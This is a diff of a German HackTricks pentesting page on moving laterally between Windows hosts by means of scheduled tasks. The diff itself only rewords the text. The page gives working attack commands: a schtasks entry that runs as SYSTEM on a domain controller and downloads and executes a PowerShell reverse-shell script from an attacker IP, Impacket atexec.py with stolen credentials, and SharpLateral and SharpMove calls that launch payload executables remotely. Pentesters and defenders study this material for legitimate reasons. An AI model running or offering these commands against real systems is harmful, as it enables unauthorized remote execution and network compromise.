@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Wie funktioniert es
+## Wie funktioniert es?
 
-At ermöglicht das Planen von Aufgaben auf Hosts, bei denen Sie den Benutzernamen/(Passwort/Hash) kennen. So können Sie es verwenden, um Befehle auf anderen Hosts auszuführen und die Ausgabe zu erhalten.
+Mit At können Tasks auf Hosts geplant werden, für die du den Benutzernamen/(das Passwort/den Hash) kennst. Dadurch kannst du Befehle auf anderen Hosts ausführen und die Ausgabe erhalten.
 ```
 At \\victim 11:00:00PM shutdown -r
 ```
-Um schtasks zu verwenden, müssen Sie zuerst die Aufgabe erstellen und sie dann aufrufen:
+Mit schtasks müssen Sie zuerst die Aufgabe erstellen und sie anschließend aufrufen:
 ```bash
 schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
 schtasks /run /tn <TASK_NAME> /S <VICTIM>
@@ -18,18 +18,18 @@ schtasks /run /tn <TASK_NAME> /S <VICTIM>
 schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
 schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
-Sie können **Impacket's `atexec.py`** verwenden, um Befehle auf Remote-Systemen mit dem AT-Befehl auszuführen. Dies erfordert gültige Anmeldeinformationen (Benutzername und Passwort oder Hash) für das Zielsystem.
+Du kannst **Impackets `atexec.py`** verwenden, um mithilfe des AT-Befehls Befehle auf Remotesystemen auszuführen. Dafür sind gültige Anmeldedaten (Benutzername und Passwort oder Hash) für das Zielsystem erforderlich.
 ```bash
 atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
 ```
-Sie können auch [SharpLateral](https://github.com/mertdas/SharpLateral) verwenden:
+Du kannst auch [SharpLateral](https://github.com/mertdas/SharpLateral) verwenden:
 ```bash
 SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
 ```
-Sie können [SharpMove](https://github.com/0xthirteen/SharpMove) verwenden:
+Du kannst [SharpMove](https://github.com/0xthirteen/SharpMove) verwenden:
 ```bash
 SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
 ```
-Mehr Informationen über die [**Verwendung von schtasks mit Silver Tickets hier**](../active-directory-methodology/silver-ticket.md#host).
+Weitere Informationen zur [**Verwendung von schtasks mit Silver Tickets hier**](../active-directory-methodology/silver-ticket.md#host).
 
 {{#include ../../banners/hacktricks-training.md}}
